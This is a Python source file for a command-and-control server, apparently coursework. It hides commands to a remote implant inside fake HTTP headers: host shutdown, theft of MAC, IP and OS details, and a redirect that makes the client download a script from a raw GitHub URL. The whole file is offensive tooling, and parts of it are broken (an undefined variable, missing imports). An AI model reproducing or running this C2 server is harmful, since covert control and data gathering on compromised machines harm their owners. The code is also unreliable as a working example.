import socket
import base64
from datetime import datetime

SERVER_NAME = "c2server/1.0"   #used in packets to show source, should update for better obfuscation
SERVER_IP = '192.168.1.104'
SERVER_PORT = 80


def get_user_input():
    print("------------ Menu ------------")
    print(" [1] Shutdown Host")
    print(" [2] Shutdown Client")
    print(" [3] Extract MAC Address")
    print(" [4] Extract IP Address")
    print(" [5] Extract OS Information")
    print(" [6] Upload File")
    print(" [q] Quit")
    print("------------------------------")

    while True:
        choice = input(" > ")
        if choice.lower() == 'q':
            return choice.lower()
        elif choice in ['1', '2', '3', '4', '5', '6']:
            return choice
        else:
            print("[!] Error: Invalid choice")
            

def print_client_response(cmd_type, txt_body):
    if cmd_type == 1:
        print(f'Shutting down host in {txt_body} seconds')
    elif cmd_type == 2:
        print(f'Shutting down Client {txt_body} seconds')
    elif cmd_type == 3:
        print(f'MAC Address is {txt_body}')
    elif cmd_type == 4:
        print(f'IP Address is {txt_body}')
    elif cmd_type == 5:
        print(f'OS Information is {txt_body}')
    elif cmd_type == 6:
        print(f'Uploading file at {txt_body}')

def parse_request(request_data):
    request_lines = request_data.split('\r\n')

    # Determine request type (GET or POST)
    method = lines[0].split()[0]
    if method.startswith('GET'):
        return "GET", None
        
    elif method.startswith('POST'):
        
        content_length = 0
        for line in lines:
            if line.startswith('Content-Length:'):
                content_length = int(line.split(':')[1].strip())
                break

        request_body = request_data.split('\r\n\r\n', 1)[1][:content_length]
        return "POST", request_body
    
    else:
        print(f"[!] Error Processing Client Request\n{request_data}")
        return None, None

def build_packet(command):

    current_datetime = datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")

    # execute shutdowns (1: host, 2: client)
    if command == '1' or command == '2':
        print("[*] Enter shutdown delay (s) or 0 for immediate:")
        delay = input("   > ")
        etag_prefix = 's' if command == '1' else 'e'  # eTag prefix based on command
  
        packet = (
            f"HTTP/1.1 204 No Content\r\n"          
            f"Date: {current_datetime}\r\n"
            f"Server: {SERVER_NAME}\r\n"
            f"ETag: \"{etag_prefix}\"\r\n"          # who to shutdown
            f"Cache-Control: max-age={delay}\r\n"  # how long until shutdown
            f"\r\n"  # indicate end of headers
        )


    # extract host information (3: MAC, 4: IP, 5: OS info)
    elif command == '3' or command == '4' or command == '5':
        etag_prefix = 'm' if command == '3' else ('i' if command == '4' else ('o' if command == '5' else None))
        # eTag prefix based on command
        packet = (
            f"HTTP/1.1 304 Not Modified\r\n"
            f"Date: {current_datetime}\r\n"
            f"Server: {SERVER_NAME}\r\n"
            f"Cache-Control: no-cache\r\n"
            f"ETag: \"{etag_prefix}\"\r\n"          # what to extract
            f"Content-Location: /index.html\r\n"    #idea: tell where to send information
            f"\r\n"
        )
        
    # upload (6: file)
    elif command == '6':        # Upload file
        #print("[*] Enter location of file to upload:")
        #file_location = input("   > ")
        file_location = "https://raw.githubusercontent.com/KieraConway/csc841_public/main/lonelyassassins.py"
        
        packet = (
            f"HTTP/1.1 301 Moved Permanently\r\n"
            f"Date: {current_datetime}\r\n"
            f"Server: {SERVER_NAME}\r\n"
            f"Location: {file_location}\r\n"
            f"Content-Type: text/html\r\n"
            f"\r\n"
            f"<html><body><p>This resource has been permanently moved to "
            f"<a href='{file_location}'>{file_location}</a></p></body></html>"
        )

    return packet


def generate_etag(first_letter):
    ran_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return first_letter + ran_chars

if __name__ == "__main__":
    # Create a socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind((SERVER_IP, SERVER_PORT))
    server_sock.listen()
    print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT}")

    # Loop to accept incoming connections
    while True:
        try:
            client_sock, client_addr = server_sock.accept()
            print(f"[*] Accepted connection from {client_addr[0]}:{client_addr[1]}")
            
            # Receive data from the client
            request_data = client_sock.recv(1024).decode('utf-8')
            print("[*] Received data from client:")
            #print(request_data)
            
            # Parse and determine client request type
            request_type, request_body = parse_request(request_data)
            print("[*] Request Type:", request_type)
            
            if request_type is not None:
                if request_type == "POST":
                    try:
                        print("[*] Client Responded to Command")
                        cmd_type, txt_body = request_body.split(':', 1)
                        print_client_response(int(cmd_type.strip()), txt_body.strip())
                        
                    except Exception as err:
                        print("[!] Error: {err}")

                print("[*] Client Queued for Action")
            
                usr_cmd = get_user_input()
                if usr_cmd == 'q':
                    break
                else:
                    packet = build_packet(usr_cmd)         # Create Packet
                    client_sock.sendall(packet.encode('utf-8'))   # Send packet
        
        except Exception as err:
            print("[!] Error: {err}")
            break
            
    # Close the client socket
    server_sock.close()